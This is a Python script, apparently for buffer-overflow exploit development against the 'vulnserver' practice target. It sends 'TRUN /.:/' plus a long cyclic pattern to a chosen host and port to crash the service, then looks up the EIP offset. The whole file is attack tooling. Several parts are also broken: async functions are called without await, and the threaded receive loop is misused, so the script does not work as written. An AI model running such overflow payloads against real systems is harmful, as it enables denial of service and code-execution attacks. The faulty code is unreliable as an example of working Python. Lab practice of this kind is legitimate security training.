import errno
import socket
import random
import string
import asyncio
import time
import sys
from threading import Thread

# copy right
def copyRight():
    print(""""
        ____   __ __       ____  ____  __ __   ____  ___          ___  _           _____  ____  __ __    ___  ___   
        |    \ |  |  |     |    ||    ||  |  | /    ||   \        /  _]| |         / ___/ /    ||  |  |  /  _]|   \  
        |  o  )|  |  |     |__  | |  | |  |  ||  o  ||    \      /  [_ | |        (   \_ |  o  ||  |  | /  [_ |    \ 
        |     ||  ~  |     __|  | |  | |  _  ||     ||  D  |    |    _]| |___      \__  ||     ||  ~  ||    _]|  D  |
        |  O  ||___, |    /  |  | |  | |  |  ||  _  ||     |    |   [_ |     |     /  \ ||  _  ||___, ||   [_ |     |
        |     ||     |    \  `  | |  | |  |  ||  |  ||     |    |     ||     |     \    ||  |  ||     ||     ||     |
        |_____||____/      \____||____||__|__||__|__||_____|    |_____||_____|      \___||__|__||____/ |_____||_____|
        look at www.neetechs.com for more script
        """)

# Offset Pattern
async def offsetPattern(payload, totalCharacter):
	eIP = input("enter the EIP(1234567A): ").encode('ascii') or "1234567A".encode('ascii')
	# try:
	# 	if not isinstance(eIP, int) and eIP.startswith('0x'):
	# 	    eIP = struct.pack('<I', int(eIP, 16)).strip('\x00')
	# except ValueError:
	# 	print_help()
	# 	sys.exit(254)
	# pattern = payload
	try:
		print(payload.index(eIP))
		return payload.index(eIP)
	except ValueError:
		return 'Not found'

# Create Pattern
async def createPattern(length):
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, int) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, int):
            length = int(length, 10)
    except ValueError:
        sys.exit(254)
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

async def randomCharacters(y):
	return ''.join(random.choice(string.ascii_letters) for x in range(y))

async def connectToServer(s):
    # get input
    ip = input("What is the ip address(127.0.0.1): ") or "127.0.0.1"
    port = int(input("What is the the port(9999) : ") or "9999")

    # get and print the value
    s.connect((ip, port))
    print(ip + ":" + str(port) + " has been connected")
    return ip, port

async def generatePayload():
    # get input
	payload = "This should be the random characters"
	character = input("what is the character(random): ") or randomCharacters(1)
	totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
	isAllRandom =  input("is all the character are random (yes): ") or "yes"
	if isAllRandom == "yes":
		payload = [
			b"TRUN /.:/",
			createPattern(totalCharacter).encode('ascii')
		]
	else:
		payload = [
			b"TRUN /.:/",
			character.encode('ascii') * totalCharacter
		]
	# get and print the value
	payload = b" ".join(payload)
	print(payload)
	return payload, totalCharacter

    
async def receiver(s):
    print("Received: ")
    s.setblocking(1)		

    recv_len = 1
    response = ""
    #data= None
    while True:
        # moreMessage = input("input more if there is more message and nothing if there is no more message(): ") or ""
        # if moreMessage=="more":
        data = b""

        data = Thread(target = s.recv(1024)).start()

        time.sleep(0.5)
        if data == None:
            break
        data = data.decode()
        recv_len = len(data)
        print(recv_len)
        response += "\n     " + data + "\n"
        # print("")
        if recv_len < 1024:
            break
        #data = data.decode().strip("b'").replace("'","")
        #data = "\n     " + data.decode()
        print(data)
        # else:
        #     break



async def generateMessage():
    character = input("what is your message(anonymessage): ") or "anonymessage"
    payload = [
        b"TRUN /.:/",
        character.encode('ascii')
    ]
    payload = b" ".join(payload)

    return payload
async def sender(s, payload):
    receiver(s)

    #s.send(payload)
    #s.sendall(payload.encode('ascii'))
    s.sendall(payload)

# Main function
async def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    copyRight()
    ip, port = await connectToServer(s)
    payload=""
    totalCharacter=0
    while True:
        print("____________________________________________")
        await receiver(s)
        
        print("____________________________________________")
        generate = input("Do you want to generate payload in this field (y for yes and n for no)?") or "n"
        if generate == "y":
            print("____________________________________________")
            payload, totalCharacter = await generatePayload()
            print("____________________________________________")
            await sender(s, payload)
            print("____________________________________________")
            break
        else:
            payload = await generateMessage()
            print("____________________________________________")   
            await sender(s, payload)
    s.shutdown(socket.SHUT_WR)

    s.close()
    print(ip + ":" + str(port) + " has been disconnected")

    offsetPattern(payload, totalCharacter)

# Calling the main function
asyncio.run(main())